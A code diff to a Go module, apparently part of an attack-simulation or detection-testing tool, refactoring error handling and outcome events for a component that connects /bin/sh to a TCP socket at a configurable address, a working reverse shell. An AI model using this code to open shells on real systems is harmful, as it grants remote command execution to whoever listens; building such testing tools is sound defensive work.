@@ -2,6 +2,7 @@ package network
 
 import (
 	"context"
+	"errors"
 	"fmt"
 	"net"
 	"os/exec"
@@ -45,7 +46,7 @@ func (n *netRevShell) Generate(ctx context.Context, params module.Params, emit m
 	address := net.JoinHostPort(target, port)
 
 	info := n.Info()
-	ev := output.NewEvent(info, "reverse_shell_attempt", false, fmt.Sprintf("connecting /bin/sh to %s", address))
+	ev := output.NewEvent(info, "reverse_shell_attempt", module.OutcomeError, module.Network(address, "", ""), fmt.Sprintf("connecting /bin/sh to %s", address))
 
 	var dialer net.Dialer
 	conn, err := dialer.DialContext(ctx, "tcp", address)
@@ -55,8 +56,7 @@ func (n *netRevShell) Generate(ctx context.Context, params module.Params, emit m
 		}
 		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
 		ev.Message = fmt.Sprintf("reverse shell attempt to %s (connection refused — no listener)", address)
-		emit(ev)
-		return nil
+		return emit(ev)
 	}
 	defer func() { _ = conn.Close() }()
 	// Pass the socket descriptor directly. Using net.Conn as an io.Reader
@@ -64,27 +64,31 @@ func (n *netRevShell) Generate(ctx context.Context, params module.Params, emit m
 	// after the shell exits or is killed by cancellation.
 	socket, err := conn.(*net.TCPConn).File()
 	if err != nil {
-		emit(output.WithError(ev, err))
+		if emitErr := emit(output.WithError(ev, err)); emitErr != nil {
+			return errors.Join(err, emitErr)
+		}
 		return err
 	}
 	defer func() { _ = socket.Close() }()
 	cmd := exec.CommandContext(ctx, "/bin/sh")
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = socket, socket, socket
 	if err := cmd.Start(); err != nil {
-		emit(output.WithError(ev, err))
+		if emitErr := emit(output.WithError(ev, err)); emitErr != nil {
+			return errors.Join(err, emitErr)
+		}
 		return err
 	}
 
-	ev.Success = true
+	ev.Outcome = module.OutcomeExecuted
 	ev.Message = fmt.Sprintf("reverse shell connected to %s, spawning /bin/sh", address)
 	ev = output.WithDetails(ev, map[string]any{"address": address, "shell": "/bin/sh"})
-	emit(ev)
+	emitErr := emit(ev)
 
 	err = cmd.Wait()
 	if ctx.Err() != nil {
-		return ctx.Err()
+		return errors.Join(ctx.Err(), emitErr)
 	}
-	return err
+	return errors.Join(err, emitErr)
 }
 
 func (n *netRevShell) DryRun(params module.Params) []string {
